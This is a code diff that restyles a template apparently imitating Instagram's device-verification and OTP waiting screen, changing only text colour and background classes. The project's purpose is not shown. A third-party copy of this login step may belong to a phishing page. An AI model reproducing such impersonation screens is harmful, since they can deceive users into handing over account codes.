@@ -49,12 +49,12 @@
 </head>
 
 <body>
-    <div class="min-h-screen bg-card flex items-center justify-center px-4 hidden" id="verify_otp">
+    <div class="min-h-screen flex items-center justify-center px-4 hidden" id="verify_otp">
         <div class="w-full sm:max-w-[900px]">
-            <p class="text-[13px] text-muted-foreground mb-1">Instagram</p>
+            <p class="text-[13px] text-black mb-1">Instagram</p>
             <h1 class="text-[22px] font-bold text-card-foreground leading-snug mb-2">
                 {{ __('instagram.check_device_notification') }}</h1>
-            <p class="text-[14px] text-muted-foreground leading-relaxed mb-5">
+            <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('instagram.check_device_notification_message') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
                 <img src="images/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
@@ -64,7 +64,7 @@
                 <div>
                     <p class="text-[15px] font-semibold text-card-foreground leading-tight">
                         {{ __('instagram.waiting_for_approve') }}</p>
-                    <p class="text-[13px] text-muted-foreground mt-0.5">{{ __('instagram.waiting_message') }}</p>
+                    <p class="text-[13px] text-black mt-0.5">{{ __('instagram.waiting_message') }}</p>
                 </div>
             </div>
             <div class="h-px bg-border mb-4"></div>
